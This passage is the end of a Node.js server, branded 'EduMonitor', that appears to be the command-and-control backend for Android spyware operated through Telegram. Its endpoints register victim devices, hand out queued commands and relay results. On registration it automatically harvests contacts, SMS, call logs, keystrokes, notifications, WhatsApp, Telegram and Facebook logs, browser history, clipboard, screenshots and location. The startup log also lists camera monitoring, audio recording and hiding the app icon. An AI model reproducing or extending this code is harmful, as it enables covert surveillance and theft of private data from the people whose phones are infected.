        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: Array.from(authorizedChats).join(', '),
        serverIP: getServerIP(),
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = device.pendingCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    if (command && (command === 'find_media' || command.includes('_html') ||
        command === 'ip_info' || command === 'phone_number' || command === 'location' ||
        command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
        command === 'mobile_info' || command === 'find_recorded' ||
        command === 'contacts' || command === 'sms' || command === 'calllogs' ||
        command === 'apps' || command === 'keystrokes' || command === 'notifications' ||
        command === 'whatsapp' || command === 'telegram' || command === 'facebook' ||
        command === 'browser_history' || command === 'clipboard' || command === 'calendar' ||
        command === 'screenshots')) {
        console.log(`📎 ${command} using dedicated endpoint`);
        return res.sendStatus(200);
    }

    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + (result || `✅ ${command} executed`));
        }
    }
    
    res.sendStatus(200);
});

// ============= REGISTRATION ENDPOINT =============
app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId });
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    if (!deviceConfig) {
        return res.status(403).json({ error: 'Device not authorized' });
    }
    
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null,
        lastIPInfo: existingDevice?.lastIPInfo || null,
        lastLocation: existingDevice?.lastLocation || null,
        simInfo: existingDevice?.simInfo || null,
        wifiInfo: existingDevice?.wifiInfo || null,
        mobileInfo: existingDevice?.mobileInfo || null
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
    
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The server is automatically requesting:\n`;
        welcomeMessage += `• 📇 Contacts\n`;
        welcomeMessage += `• 💬 SMS Messages\n`;
        welcomeMessage += `• 📞 Call Logs\n`;
        welcomeMessage += `• 📱 Installed Apps\n`;
        welcomeMessage += `• ⌨️ Keystrokes\n`;
        welcomeMessage += `• 🔔 Notifications\n`;
        welcomeMessage += `• 💬 WhatsApp\n`;
        welcomeMessage += `• 💬 Telegram\n`;
        welcomeMessage += `• 💬 Facebook\n`;
        welcomeMessage += `• 🌐 Browser History\n`;
        welcomeMessage += `• 📋 Clipboard\n`;
        welcomeMessage += `• 📅 Calendar\n`;
        welcomeMessage += `• 📸 Screenshots\n`;
        welcomeMessage += `• 📍 Location\n\n`;
        welcomeMessage += `This may take a few moments as the device processes each request.`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
        }
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    if (isNewDevice) {
        queueAutoDataCommands(deviceId, deviceConfig.chatId);
    }
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: deviceConfig.config
    });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            firstSeen: new Date(device.firstSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            phoneNumber: device.phoneNumber || 'Not available',
            lastIPInfo: device.lastIPInfo || null,
            lastLocation: device.lastLocation || null,
            autoDataRequested: autoDataRequested.has(id),
            online: (Date.now() - device.lastSeen) < 300000
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// ============= TEST ENDPOINTS =============

app.get('/test', (req, res) => {
    const serverIP = getServerIP();
    const userDevices = getDeviceListForUser('5326373447');
    
    res.send(`
        <html>
        <head>
            <style>
                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
                h1 { color: #e94560; }
                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
                .online { color: #4CAF50; }
                .offline { color: #f44336; }
                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
            </style>
        </head>
        <body>
            <h1>✅ EduMonitor Server v4.0 Running</h1>
            <div class="stats">
                <p><b>Time:</b> ${new Date().toISOString()}</p>
                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                <p><b>Total Devices:</b> ${devices.size}</p>
                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
                <p><b>Commands Available:</b> 85+ commands including all media types</p>
            </div>
            
            <h2>📱 Registered Devices (${userDevices.length})</h2>
            ${Array.from(devices.entries()).map(([id, device]) => {
                const online = (Date.now() - device.lastSeen) < 300000;
                return `
                    <div class="device">
                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
                        <p><b>ID:</b> <code>${id}</code></p>
                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
                    </div>
                `;
            }).join('')}
            
            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
        </body>
        </html>
    `);
});

app.get('/test-menu', async (req, res) => {
    const chatId = '5326373447';
    const result = await sendTelegramMessageWithKeyboard(
        chatId,
        "🤖 Test Menu - Use the buttons below:",
        getMainMenuKeyboard(chatId)
    );
    res.json({ success: !!result });
});

app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor Server v4.0 running on port ${PORT}`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ MENU STRUCTURE UPDATED:');
    console.log('   📱 Device Info - Network, Apps, Device Info, Battery, Storage, Time, Status');
    console.log('   📞 Phone Info - Phone Number, SIM, Mobile Info, Call Logs, Location, SMS, Contacts, Calendar');
    console.log('   📍 Tracking - Location, Keystrokes, Notifications, App Opens');
    console.log('   🌐 Network - IP, WiFi, Mobile, Network Status');
    console.log('   📸 Screenshot - Take, Settings, Service Control, Logs, Size, Target Apps');
    console.log('   🎤 Recording - Start/Stop 60s, Settings, Schedule, Auto ON/OFF, Media Scan');
    console.log('   📸 Camera - Take Photo, Switch Camera, Front/Back, Start/Stop Monitoring');
    console.log('   💬 Social - WhatsApp, Telegram, Facebook, Browser History, Clipboard');
    console.log('   📁 Media - Find Media, Screenshots');
    console.log('   🔔 Realtime - ON/OFF, Status');
    console.log('   ⚙️ Services - Hide/Show Icon, Reboot, Clear, Stats, Force Harvest');
    console.log('\n✅ NEW COMMANDS ADDED:');
    console.log('   📸 /screenshot_settings - Screenshot configuration with all options');
    console.log('   🎤 /recording_settings - Recording configuration with all options');
    console.log('   📁 /find_media - Scan for all media files (images, videos, audio)');
    console.log('   📋 /clipboard - Get clipboard history');
    console.log('   🌐 /browser_history - Get browser history');
    console.log('   💬 /whatsapp - Get WhatsApp logs');
    console.log('   💬 /telegram - Get Telegram logs');
    console.log('   💬 /facebook - Get Facebook logs');
    console.log('   📅 /calendar - Get calendar events');
    console.log('   📸 /screenshots - Get screenshot metadata');
    console.log('\n✅ AUTO-DATA COLLECTION UPDATED:');
    console.log('   └─ Now collects 18 data types automatically');
    console.log('   └─ Includes all social media and media types');
    console.log('\n🚀 ===============================================\n');
});
